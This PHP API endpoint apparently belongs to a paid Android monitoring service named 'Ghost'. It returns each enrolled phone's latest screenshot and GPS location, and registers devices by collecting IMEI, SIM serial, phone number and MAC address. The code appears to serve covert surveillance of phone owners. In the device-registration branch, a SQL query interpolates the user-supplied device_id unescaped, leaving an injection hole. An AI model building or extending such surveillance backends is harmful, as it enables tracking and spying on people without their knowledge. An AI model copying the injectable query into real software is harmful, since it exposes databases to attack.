<?php
// api/v1/devices.php
require_once '../../config/ghost_config.php';
header('Content-Type: application/json');

// Vérification API key
$headers = getallheaders();
$api_key = $headers['X-API-Key'] ?? '';

if (!$api_key) {
    http_response_code(401);
    echo json_encode(['error' => 'API key requise']);
    exit;
}

$stmt = $pdo->prepare("SELECT * FROM users WHERE api_key = ?");
$stmt->execute([$api_key]);
$user = $stmt->fetch();

if (!$user) {
    http_response_code(403);
    echo json_encode(['error' => 'API key invalide']);
    exit;
}

// Vérifier si l'utilisateur est actif
if ($user['account_status'] !== 'active') {
    http_response_code(403);
    echo json_encode(['error' => 'Compte inactif']);
    exit;
}

$method = $_SERVER['REQUEST_METHOD'];

// ============================================
// GET - Liste des appareils
// ============================================
if ($method === 'GET') {
    $stmt = $pdo->prepare("
        SELECT * FROM devices 
        WHERE user_id = ? 
        ORDER BY last_seen DESC
    ");
    $stmt->execute([$user['id']]);
    $devices = $stmt->fetchAll();
    
    // Enrichir les données
    foreach ($devices as &$device) {
        $last_seen = strtotime($device['last_seen']);
        $device['online'] = (time() - $last_seen) < 60;
        $device['last_seen_ago'] = $last_seen ? timeAgo($last_seen) : 'Jamais';
        
        // Récupérer la dernière capture
        $stmt2 = $pdo->prepare("
            SELECT file_path, captured_at FROM media_captures 
            WHERE device_id = ? AND media_type = 'screenshot' 
            ORDER BY captured_at DESC LIMIT 1
        ");
        $stmt2->execute([$device['id']]);
        $last_capture = $stmt2->fetch();
        
        if ($last_capture) {
            $device['last_screenshot'] = GHOST_URL . '/uploads/' . $last_capture['file_path'];
            $device['last_screenshot_time'] = timeAgo(strtotime($last_capture['captured_at']));
        }
        
        // Dernière localisation
        $stmt2 = $pdo->prepare("
            SELECT * FROM locations 
            WHERE device_id = ? 
            ORDER BY timestamp DESC LIMIT 1
        ");
        $stmt2->execute([$device['id']]);
        $last_loc = $stmt2->fetch();
        
        if ($last_loc) {
            $device['last_location'] = [
                'lat' => $last_loc['latitude'],
                'lng' => $last_loc['longitude'],
                'address' => $last_loc['address'],
                'time' => timeAgo(strtotime($last_loc['timestamp']))
            ];
        }
    }
    
    echo json_encode(['devices' => $devices]);
    exit;
}

// ============================================
// POST - Enregistrer un nouvel appareil
// ============================================
if ($method === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    // Vérifier la limite d'appareils
    $stmt = $pdo->prepare("SELECT COUNT(*) as count FROM devices WHERE user_id = ?");
    $stmt->execute([$user['id']]);
    $count = $stmt->fetch()['count'];
    
    $maxDevices = PRICING[$user['account_type']]['max_devices'];
    
    if ($count >= $maxDevices) {
        http_response_code(403);
        echo json_encode(['error' => 'Limite d\'appareils atteinte', 'max' => $maxDevices]);
        exit;
    }
    
    $device_id = $input['device_id'] ?? '';
    $device_name = $input['device_name'] ?? 'Android Device';
    $model = $input['model'] ?? '';
    $manufacturer = $input['manufacturer'] ?? '';
    $android_version = $input['android_version'] ?? '';
    $sdk_version = $input['sdk_version'] ?? 0;
    $serial = $input['serial'] ?? '';
    $hardware_info = $input['hardware_info'] ?? '';
    
    // Identifiants uniques
    $imei = $input['imei'] ?? '';
    $sim_serial = $input['sim_serial'] ?? '';
    $phone_number = $input['phone_number'] ?? '';
    $mac_address = $input['mac_address'] ?? '';
    
    $is_rooted = $input['is_rooted'] ?? false;
    
    // Enregistrer ou mettre à jour
    $stmt = $pdo->prepare("
        INSERT INTO devices (
            user_id, device_id, device_name, device_model, manufacturer, 
            android_version, sdk_version, serial_number, hardware_info,
            imei_hash, sim_serial_hash, phone_number, mac_address,
            is_rooted, last_seen
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())
        ON DUPLICATE KEY UPDATE
            device_name = VALUES(device_name),
            device_model = VALUES(device_model),
            manufacturer = VALUES(manufacturer),
            android_version = VALUES(android_version),
            sdk_version = VALUES(sdk_version),
            serial_number = VALUES(serial_number),
            hardware_info = VALUES(hardware_info),
            imei_hash = VALUES(imei_hash),
            sim_serial_hash = VALUES(sim_serial_hash),
            phone_number = VALUES(phone_number),
            mac_address = VALUES(mac_address),
            is_rooted = VALUES(is_rooted),
            last_seen = NOW()
    ");
    
    $stmt->execute([
        $user['id'],
        $device_id,
        $device_name,
        $model,
        $manufacturer,
        $android_version,
        $sdk_version,
        $serial,
        $hardware_info,
        $imei ? hash('sha256', $imei) : null,
        $sim_serial ? hash('sha256', $sim_serial) : null,
        $phone_number,
        $mac_address,
        $is_rooted ? 1 : 0
    ]);
    
    $deviceDbId = $pdo->lastInsertId() ?: $pdo->query("SELECT id FROM devices WHERE device_id = '$device_id'")->fetchColumn();
    
    // Mettre à jour le compteur
    $pdo->prepare("UPDATE users SET total_devices = total_devices + 1 WHERE id = ?")->execute([$user['id']]);
    
    logActivity($pdo, $user['id'], $deviceDbId, 'device_registered', ['device_id' => $device_id]);
    
    echo json_encode(['success' => true, 'device_id' => $deviceDbId]);
    exit;
}

http_response_code(405);
echo json_encode(['error' => 'Méthode non autorisée']);

function timeAgo($timestamp) {
    $diff = time() - $timestamp;
    
    if ($diff < 60) return 'à l\'instant';
    if ($diff < 3600) return floor($diff / 60) . ' min';
    if ($diff < 86400) return floor($diff / 3600) . ' h';
    return floor($diff / 86400) . ' j';
}
?>
